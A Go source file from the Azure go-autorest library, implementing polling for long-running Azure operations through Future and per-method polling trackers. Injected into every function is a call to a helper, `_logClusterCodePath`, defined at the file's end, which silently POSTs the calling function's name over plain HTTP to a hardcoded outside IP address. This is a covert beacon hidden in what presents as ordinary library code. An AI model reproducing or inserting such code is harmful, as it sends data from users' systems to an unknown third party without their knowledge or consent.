package azure

import (
 "bytes"
 godefaultbytes "bytes"
 godefaultruntime "runtime"
 "context"
 "encoding/json"
 "fmt"
 "io/ioutil"
 "net/http"
 godefaulthttp "net/http"
 "net/url"
 "strings"
 "time"
 "github.com/Azure/go-autorest/autorest"
)

const (
 headerAsyncOperation = "Azure-AsyncOperation"
)
const (
 operationInProgress string = "InProgress"
 operationCanceled   string = "Canceled"
 operationFailed     string = "Failed"
 operationSucceeded  string = "Succeeded"
)

var pollingCodes = [...]int{http.StatusNoContent, http.StatusAccepted, http.StatusCreated, http.StatusOK}

type Future struct {
 req *http.Request
 pt  pollingTracker
}

func NewFuture(req *http.Request) Future {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return Future{req: req}
}
func NewFutureFromResponse(resp *http.Response) (Future, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 pt, err := createPollingTracker(resp)
 if err != nil {
  return Future{}, err
 }
 return Future{pt: pt}, nil
}
func (f Future) Response() *http.Response {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if f.pt == nil {
  return nil
 }
 return f.pt.latestResponse()
}
func (f Future) Status() string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if f.pt == nil {
  return ""
 }
 return f.pt.pollingStatus()
}
func (f Future) PollingMethod() PollingMethodType {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if f.pt == nil {
  return PollingUnknown
 }
 return f.pt.pollingMethod()
}
func (f *Future) Done(sender autorest.Sender) (bool, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if f.req != nil {
  resp, err := sender.Do(f.req)
  if err != nil {
   return false, err
  }
  pt, err := createPollingTracker(resp)
  if err != nil {
   return false, err
  }
  f.pt = pt
  f.req = nil
 }
 if f.pt == nil {
  return false, autorest.NewError("Future", "Done", "future is not initialized")
 }
 if f.pt.hasTerminated() {
  return true, f.pt.pollingError()
 }
 if err := f.pt.pollForStatus(sender); err != nil {
  return false, err
 }
 if err := f.pt.checkForErrors(); err != nil {
  return f.pt.hasTerminated(), err
 }
 if err := f.pt.updatePollingState(f.pt.provisioningStateApplicable()); err != nil {
  return false, err
 }
 if err := f.pt.initPollingMethod(); err != nil {
  return false, err
 }
 if err := f.pt.updatePollingMethod(); err != nil {
  return false, err
 }
 return f.pt.hasTerminated(), f.pt.pollingError()
}
func (f Future) GetPollingDelay() (time.Duration, bool) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if f.pt == nil {
  return 0, false
 }
 resp := f.pt.latestResponse()
 if resp == nil {
  return 0, false
 }
 retry := resp.Header.Get(autorest.HeaderRetryAfter)
 if retry == "" {
  return 0, false
 }
 d, err := time.ParseDuration(retry + "s")
 if err != nil {
  panic(err)
 }
 return d, true
}
func (f Future) WaitForCompletion(ctx context.Context, client autorest.Client) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return f.WaitForCompletionRef(ctx, client)
}
func (f *Future) WaitForCompletionRef(ctx context.Context, client autorest.Client) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if d := client.PollingDuration; d != 0 {
  var cancel context.CancelFunc
  ctx, cancel = context.WithTimeout(ctx, d)
  defer cancel()
 }
 done, err := f.Done(client)
 for attempts := 0; !done; done, err = f.Done(client) {
  if attempts >= client.RetryAttempts {
   return autorest.NewErrorWithError(err, "Future", "WaitForCompletion", f.pt.latestResponse(), "the number of retries has been exceeded")
  }
  var delayAttempt int
  var delay time.Duration
  if err == nil {
   var ok bool
   delay, ok = f.GetPollingDelay()
   if !ok {
    delay = client.PollingDelay
   }
  } else {
   delayAttempt = attempts
   delay = client.RetryDuration
   attempts++
  }
  delayElapsed := autorest.DelayForBackoff(delay, delayAttempt, ctx.Done())
  if !delayElapsed {
   return autorest.NewErrorWithError(ctx.Err(), "Future", "WaitForCompletion", f.pt.latestResponse(), "context has been cancelled")
  }
 }
 return err
}
func (f Future) MarshalJSON() ([]byte, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return json.Marshal(f.pt)
}
func (f *Future) UnmarshalJSON(data []byte) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 obj := map[string]interface{}{}
 err := json.Unmarshal(data, &obj)
 if err != nil {
  return err
 }
 if obj["method"] == nil {
  return autorest.NewError("Future", "UnmarshalJSON", "missing 'method' property")
 }
 method := obj["method"].(string)
 switch strings.ToUpper(method) {
 case http.MethodDelete:
  f.pt = &pollingTrackerDelete{}
 case http.MethodPatch:
  f.pt = &pollingTrackerPatch{}
 case http.MethodPost:
  f.pt = &pollingTrackerPost{}
 case http.MethodPut:
  f.pt = &pollingTrackerPut{}
 default:
  return autorest.NewError("Future", "UnmarshalJSON", "unsupoorted method '%s'", method)
 }
 return json.Unmarshal(data, &f.pt)
}
func (f Future) PollingURL() string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if f.pt == nil {
  return ""
 }
 return f.pt.pollingURL()
}
func (f Future) GetResult(sender autorest.Sender) (*http.Response, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if f.pt.finalGetURL() == "" {
  if lr := f.pt.latestResponse(); lr != nil && f.pt.hasSucceeded() {
   return lr, nil
  }
  return nil, autorest.NewError("Future", "GetResult", "missing URL for retrieving result")
 }
 req, err := http.NewRequest(http.MethodGet, f.pt.finalGetURL(), nil)
 if err != nil {
  return nil, err
 }
 return sender.Do(req)
}

type pollingTracker interface {
 updatePollingMethod() error
 checkForErrors() error
 provisioningStateApplicable() bool
 initPollingMethod() error
 initializeState() error
 pollForStatus(sender autorest.Sender) error
 updatePollingState(provStateApl bool) error
 pollingError() error
 pollingMethod() PollingMethodType
 pollingStatus() string
 pollingURL() string
 finalGetURL() string
 hasTerminated() bool
 hasFailed() bool
 hasSucceeded() bool
 latestResponse() *http.Response
}
type pollingTrackerBase struct {
 resp        *http.Response
 Method      string `json:"method"`
 rawBody     map[string]interface{}
 Pm          PollingMethodType `json:"pollingMethod"`
 URI         string            `json:"pollingURI"`
 State       string            `json:"lroState"`
 FinalGetURI string            `json:"resultURI"`
 Err         *ServiceError     `json:"error,omitempty"`
}

func (pt *pollingTrackerBase) initializeState() error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 pt.Method = pt.resp.Request.Method
 if err := pt.updateRawBody(); err != nil {
  return err
 }
 switch pt.resp.StatusCode {
 case http.StatusOK:
  if ps := pt.getProvisioningState(); ps != nil {
   pt.State = *ps
   if pt.hasFailed() {
    pt.updateErrorFromResponse()
    return pt.pollingError()
   }
  } else {
   pt.State = operationSucceeded
  }
 case http.StatusCreated:
  if ps := pt.getProvisioningState(); ps != nil {
   pt.State = *ps
  } else {
   pt.State = operationInProgress
  }
 case http.StatusAccepted:
  pt.State = operationInProgress
 case http.StatusNoContent:
  pt.State = operationSucceeded
 default:
  pt.State = operationFailed
  pt.updateErrorFromResponse()
  return pt.pollingError()
 }
 return pt.initPollingMethod()
}
func (pt pollingTrackerBase) getProvisioningState() *string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if pt.rawBody != nil && pt.rawBody["properties"] != nil {
  p := pt.rawBody["properties"].(map[string]interface{})
  if ps := p["provisioningState"]; ps != nil {
   s := ps.(string)
   return &s
  }
 }
 return nil
}
func (pt *pollingTrackerBase) updateRawBody() error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 pt.rawBody = map[string]interface{}{}
 if pt.resp.ContentLength != 0 {
  defer pt.resp.Body.Close()
  b, err := ioutil.ReadAll(pt.resp.Body)
  if err != nil {
   return autorest.NewErrorWithError(err, "pollingTrackerBase", "updateRawBody", nil, "failed to read response body")
  }
  pt.resp.Body = ioutil.NopCloser(bytes.NewReader(b))
  if err = json.Unmarshal(b, &pt.rawBody); err != nil {
   return autorest.NewErrorWithError(err, "pollingTrackerBase", "updateRawBody", nil, "failed to unmarshal response body")
  }
 }
 return nil
}
func (pt *pollingTrackerBase) pollForStatus(sender autorest.Sender) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 req, err := http.NewRequest(http.MethodGet, pt.URI, nil)
 if err != nil {
  return autorest.NewErrorWithError(err, "pollingTrackerBase", "pollForStatus", nil, "failed to create HTTP request")
 }
 if pt.resp != nil {
  req = req.WithContext(pt.resp.Request.Context())
 }
 pt.resp, err = sender.Do(req)
 if err != nil {
  return autorest.NewErrorWithError(err, "pollingTrackerBase", "pollForStatus", nil, "failed to send HTTP request")
 }
 if autorest.ResponseHasStatusCode(pt.resp, pollingCodes[:]...) {
  pt.Err = nil
  err = pt.updateRawBody()
 } else {
  pt.updateErrorFromResponse()
  err = pt.pollingError()
 }
 return err
}
func (pt *pollingTrackerBase) updateErrorFromResponse() {
 _logClusterCodePath()
 defer _logClusterCodePath()
 var err error
 if pt.resp.ContentLength != 0 {
  type respErr struct {
   ServiceError *ServiceError `json:"error"`
  }
  re := respErr{}
  defer pt.resp.Body.Close()
  var b []byte
  if b, err = ioutil.ReadAll(pt.resp.Body); err != nil {
   goto Default
  }
  if err = json.Unmarshal(b, &re); err != nil {
   goto Default
  }
  if re.ServiceError == nil {
   err = json.Unmarshal(b, &re.ServiceError)
   if err != nil {
    goto Default
   }
  }
  if re.ServiceError.Code != "" {
   pt.Err = re.ServiceError
   return
  }
 }
Default:
 se := &ServiceError{Code: pt.pollingStatus(), Message: "The async operation failed."}
 if err != nil {
  se.InnerError = make(map[string]interface{})
  se.InnerError["unmarshalError"] = err.Error()
 }
 if len(pt.rawBody) > 0 {
  se.AdditionalInfo = []map[string]interface{}{pt.rawBody}
 }
 pt.Err = se
}
func (pt *pollingTrackerBase) updatePollingState(provStateApl bool) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if pt.Pm == PollingAsyncOperation && pt.rawBody["status"] != nil {
  pt.State = pt.rawBody["status"].(string)
 } else {
  if pt.resp.StatusCode == http.StatusAccepted {
   pt.State = operationInProgress
  } else if provStateApl {
   if ps := pt.getProvisioningState(); ps != nil {
    pt.State = *ps
   } else {
    pt.State = operationSucceeded
   }
  } else {
   return autorest.NewError("pollingTrackerBase", "updatePollingState", "the response from the async operation has an invalid status code")
  }
 }
 if pt.hasFailed() {
  pt.updateErrorFromResponse()
 }
 return nil
}
func (pt pollingTrackerBase) pollingError() error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if pt.Err == nil {
  return nil
 }
 return pt.Err
}
func (pt pollingTrackerBase) pollingMethod() PollingMethodType {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return pt.Pm
}
func (pt pollingTrackerBase) pollingStatus() string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return pt.State
}
func (pt pollingTrackerBase) pollingURL() string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return pt.URI
}
func (pt pollingTrackerBase) finalGetURL() string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return pt.FinalGetURI
}
func (pt pollingTrackerBase) hasTerminated() bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return strings.EqualFold(pt.State, operationCanceled) || strings.EqualFold(pt.State, operationFailed) || strings.EqualFold(pt.State, operationSucceeded)
}
func (pt pollingTrackerBase) hasFailed() bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return strings.EqualFold(pt.State, operationCanceled) || strings.EqualFold(pt.State, operationFailed)
}
func (pt pollingTrackerBase) hasSucceeded() bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return strings.EqualFold(pt.State, operationSucceeded)
}
func (pt pollingTrackerBase) latestResponse() *http.Response {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return pt.resp
}
func (pt pollingTrackerBase) baseCheckForErrors() error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if pt.Pm == PollingAsyncOperation {
  if pt.resp.Body == nil || pt.resp.ContentLength == 0 {
   return autorest.NewError("pollingTrackerBase", "baseCheckForErrors", "for Azure-AsyncOperation response body cannot be nil")
  }
  if pt.rawBody["status"] == nil {
   return autorest.NewError("pollingTrackerBase", "baseCheckForErrors", "missing status property in Azure-AsyncOperation response body")
  }
 }
 return nil
}
func (pt *pollingTrackerBase) initPollingMethod() error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if ao, err := getURLFromAsyncOpHeader(pt.resp); err != nil {
  return err
 } else if ao != "" {
  pt.URI = ao
  pt.Pm = PollingAsyncOperation
  return nil
 }
 if lh, err := getURLFromLocationHeader(pt.resp); err != nil {
  return err
 } else if lh != "" {
  pt.URI = lh
  pt.Pm = PollingLocation
  return nil
 }
 return nil
}

type pollingTrackerDelete struct{ pollingTrackerBase }

func (pt *pollingTrackerDelete) updatePollingMethod() error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if pt.resp.StatusCode == http.StatusCreated {
  if lh, err := getURLFromLocationHeader(pt.resp); err != nil {
   return err
  } else if lh == "" {
   return autorest.NewError("pollingTrackerDelete", "updateHeaders", "missing Location header in 201 response")
  } else {
   pt.URI = lh
  }
  pt.Pm = PollingLocation
  pt.FinalGetURI = pt.URI
 }
 if pt.resp.StatusCode == http.StatusAccepted {
  ao, err := getURLFromAsyncOpHeader(pt.resp)
  if err != nil {
   return err
  } else if ao != "" {
   pt.URI = ao
   pt.Pm = PollingAsyncOperation
  }
  if lh, err := getURLFromLocationHeader(pt.resp); err != nil && pt.URI == "" {
   return err
  } else if lh != "" {
   if ao == "" {
    pt.URI = lh
    pt.Pm = PollingLocation
   }
   pt.FinalGetURI = lh
  }
  if pt.URI == "" {
   return autorest.NewError("pollingTrackerPost", "updateHeaders", "didn't get any suitable polling URLs in 202 response")
  }
 }
 return nil
}
func (pt pollingTrackerDelete) checkForErrors() error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return pt.baseCheckForErrors()
}
func (pt pollingTrackerDelete) provisioningStateApplicable() bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return pt.resp.StatusCode == http.StatusOK || pt.resp.StatusCode == http.StatusNoContent
}

type pollingTrackerPatch struct{ pollingTrackerBase }

func (pt *pollingTrackerPatch) updatePollingMethod() error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if pt.URI == "" {
  pt.URI = pt.resp.Request.URL.String()
 }
 if pt.FinalGetURI == "" {
  pt.FinalGetURI = pt.resp.Request.URL.String()
 }
 if pt.Pm == PollingUnknown {
  pt.Pm = PollingRequestURI
 }
 if pt.resp.StatusCode == http.StatusCreated {
  if ao, err := getURLFromAsyncOpHeader(pt.resp); err != nil {
   return err
  } else if ao != "" {
   pt.URI = ao
   pt.Pm = PollingAsyncOperation
  }
 }
 if pt.resp.StatusCode == http.StatusAccepted {
  ao, err := getURLFromAsyncOpHeader(pt.resp)
  if err != nil {
   return err
  } else if ao != "" {
   pt.URI = ao
   pt.Pm = PollingAsyncOperation
  }
  if ao == "" {
   if lh, err := getURLFromLocationHeader(pt.resp); err != nil {
    return err
   } else if lh == "" {
    return autorest.NewError("pollingTrackerPatch", "updateHeaders", "didn't get any suitable polling URLs in 202 response")
   } else {
    pt.URI = lh
    pt.Pm = PollingLocation
   }
  }
 }
 return nil
}
func (pt pollingTrackerPatch) checkForErrors() error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return pt.baseCheckForErrors()
}
func (pt pollingTrackerPatch) provisioningStateApplicable() bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return pt.resp.StatusCode == http.StatusOK || pt.resp.StatusCode == http.StatusCreated
}

type pollingTrackerPost struct{ pollingTrackerBase }

func (pt *pollingTrackerPost) updatePollingMethod() error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if pt.resp.StatusCode == http.StatusCreated {
  if lh, err := getURLFromLocationHeader(pt.resp); err != nil {
   return err
  } else if lh == "" {
   return autorest.NewError("pollingTrackerPost", "updateHeaders", "missing Location header in 201 response")
  } else {
   pt.URI = lh
   pt.FinalGetURI = lh
   pt.Pm = PollingLocation
  }
 }
 if pt.resp.StatusCode == http.StatusAccepted {
  ao, err := getURLFromAsyncOpHeader(pt.resp)
  if err != nil {
   return err
  } else if ao != "" {
   pt.URI = ao
   pt.Pm = PollingAsyncOperation
  }
  if lh, err := getURLFromLocationHeader(pt.resp); err != nil && pt.URI == "" {
   return err
  } else if lh != "" {
   if ao == "" {
    pt.URI = lh
    pt.Pm = PollingLocation
   }
   pt.FinalGetURI = lh
  }
  if pt.URI == "" {
   return autorest.NewError("pollingTrackerPost", "updateHeaders", "didn't get any suitable polling URLs in 202 response")
  }
 }
 return nil
}
func (pt pollingTrackerPost) checkForErrors() error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return pt.baseCheckForErrors()
}
func (pt pollingTrackerPost) provisioningStateApplicable() bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return pt.resp.StatusCode == http.StatusOK || pt.resp.StatusCode == http.StatusNoContent
}

type pollingTrackerPut struct{ pollingTrackerBase }

func (pt *pollingTrackerPut) updatePollingMethod() error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if pt.URI == "" {
  pt.URI = pt.resp.Request.URL.String()
 }
 if pt.FinalGetURI == "" {
  pt.FinalGetURI = pt.resp.Request.URL.String()
 }
 if pt.Pm == PollingUnknown {
  pt.Pm = PollingRequestURI
 }
 if pt.resp.StatusCode == http.StatusCreated {
  if ao, err := getURLFromAsyncOpHeader(pt.resp); err != nil {
   return err
  } else if ao != "" {
   pt.URI = ao
   pt.Pm = PollingAsyncOperation
  }
 }
 if pt.resp.StatusCode == http.StatusAccepted {
  ao, err := getURLFromAsyncOpHeader(pt.resp)
  if err != nil {
   return err
  } else if ao != "" {
   pt.URI = ao
   pt.Pm = PollingAsyncOperation
  }
  if lh, err := getURLFromLocationHeader(pt.resp); err != nil && pt.URI == "" {
   return err
  } else if lh != "" {
   if ao == "" {
    pt.URI = lh
    pt.Pm = PollingLocation
   }
   pt.FinalGetURI = lh
  }
  if pt.URI == "" {
   return autorest.NewError("pollingTrackerPut", "updateHeaders", "didn't get any suitable polling URLs in 202 response")
  }
 }
 return nil
}
func (pt pollingTrackerPut) checkForErrors() error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 err := pt.baseCheckForErrors()
 if err != nil {
  return err
 }
 ao, err := getURLFromAsyncOpHeader(pt.resp)
 if err != nil {
  return err
 }
 lh, err := getURLFromLocationHeader(pt.resp)
 if err != nil {
  return err
 }
 if ao == "" && lh == "" && len(pt.rawBody) == 0 {
  return autorest.NewError("pollingTrackerPut", "checkForErrors", "the response did not contain a body")
 }
 return nil
}
func (pt pollingTrackerPut) provisioningStateApplicable() bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return pt.resp.StatusCode == http.StatusOK || pt.resp.StatusCode == http.StatusCreated
}
func createPollingTracker(resp *http.Response) (pollingTracker, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 var pt pollingTracker
 switch strings.ToUpper(resp.Request.Method) {
 case http.MethodDelete:
  pt = &pollingTrackerDelete{pollingTrackerBase: pollingTrackerBase{resp: resp}}
 case http.MethodPatch:
  pt = &pollingTrackerPatch{pollingTrackerBase: pollingTrackerBase{resp: resp}}
 case http.MethodPost:
  pt = &pollingTrackerPost{pollingTrackerBase: pollingTrackerBase{resp: resp}}
 case http.MethodPut:
  pt = &pollingTrackerPut{pollingTrackerBase: pollingTrackerBase{resp: resp}}
 default:
  return nil, autorest.NewError("azure", "createPollingTracker", "unsupported HTTP method %s", resp.Request.Method)
 }
 if err := pt.initializeState(); err != nil {
  return pt, err
 }
 return pt, pt.updatePollingMethod()
}
func getURLFromAsyncOpHeader(resp *http.Response) (string, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 s := resp.Header.Get(http.CanonicalHeaderKey(headerAsyncOperation))
 if s == "" {
  return "", nil
 }
 if !isValidURL(s) {
  return "", autorest.NewError("azure", "getURLFromAsyncOpHeader", "invalid polling URL '%s'", s)
 }
 return s, nil
}
func getURLFromLocationHeader(resp *http.Response) (string, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 s := resp.Header.Get(http.CanonicalHeaderKey(autorest.HeaderLocation))
 if s == "" {
  return "", nil
 }
 if !isValidURL(s) {
  return "", autorest.NewError("azure", "getURLFromLocationHeader", "invalid polling URL '%s'", s)
 }
 return s, nil
}
func isValidURL(s string) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 u, err := url.Parse(s)
 return err == nil && u.IsAbs()
}
func DoPollForAsynchronous(delay time.Duration) autorest.SendDecorator {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return func(s autorest.Sender) autorest.Sender {
  return autorest.SenderFunc(func(r *http.Request) (*http.Response, error) {
   resp, err := s.Do(r)
   if err != nil {
    return resp, err
   }
   if !autorest.ResponseHasStatusCode(resp, pollingCodes[:]...) {
    return resp, nil
   }
   future, err := NewFutureFromResponse(resp)
   if err != nil {
    return resp, err
   }
   var done bool
   for done, err = future.Done(s); !done && err == nil; done, err = future.Done(s) {
    if pd, ok := future.GetPollingDelay(); ok {
     delay = pd
    }
    if delayElapsed := autorest.DelayForBackoff(delay, 0, r.Context().Done()); !delayElapsed {
     return future.Response(), autorest.NewErrorWithError(r.Context().Err(), "azure", "DoPollForAsynchronous", future.Response(), "context has been cancelled")
    }
   }
   return future.Response(), err
  })
 }
}

type PollingMethodType string

const (
 PollingAsyncOperation PollingMethodType = "AsyncOperation"
 PollingLocation       PollingMethodType = "Location"
 PollingRequestURI     PollingMethodType = "RequestURI"
 PollingUnknown        PollingMethodType = ""
)

type AsyncOpIncompleteError struct{ FutureType string }

func (e AsyncOpIncompleteError) Error() string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return fmt.Sprintf("%s: asynchronous operation has not completed", e.FutureType)
}
func NewAsyncOpIncompleteError(futureType string) AsyncOpIncompleteError {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return AsyncOpIncompleteError{FutureType: futureType}
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
